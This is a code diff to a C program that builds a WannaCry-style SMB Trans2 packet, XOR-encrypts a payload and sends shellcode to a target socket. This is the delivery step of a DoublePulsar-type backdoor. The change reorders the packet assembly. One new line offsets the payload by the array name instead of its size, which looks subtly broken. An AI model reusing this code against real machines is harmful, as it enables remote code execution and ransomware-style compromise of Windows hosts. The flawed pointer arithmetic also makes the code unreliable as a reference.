@@ -209,11 +209,6 @@ int main(int argc, char* argv[])
 		big_packet[i] = big_packet[i]^XorKey;
         }
 
-	//copy wannacry skeleton packet to big Trans2 packet
-	memcpy(big_packet, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
-	//copy encrypted payload
-	memcpy(big_packet + wannacry_Trans2_Request, encrypted, 4096);
-
 	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
 	unsigned char CHAR_XOR_KEY[4];
 
@@ -241,11 +236,18 @@ int main(int argc, char* argv[])
 	OffsetofChunkinPayloadCHAR[2] = (OffsetofChunkinPayload >> 8 >> 8) & 0xFF;
 	OffsetofChunkinPayloadCHAR[3] = (OffsetofChunkinPayload >> 8 >> 8 >> 8) & 0xFF;
 
+	//copy wannacry skeleton packet to big Trans2 packet
+	memcpy(big_packet, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
+
+	//copy SESSION_SETUP parameters
 	memcpy(big_packet + sizeof(wannacry_Trans2_Request), TotalSizeOfPayloadCHAR,4);
 	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 4, ChunkSizeCHAR,4);
 	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 8, OffsetofChunkinPayloadCHAR,4);
+	
+	//copy encrypted payload
+	memcpy(big_packet + wannacry_Trans2_Request + 12, encrypted, 4096);
 
-  //send Shellcode in Trans2 Packet
+  	//send packet
 	send(sock, (char*)big_packet, sizeof(big_packet)-1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
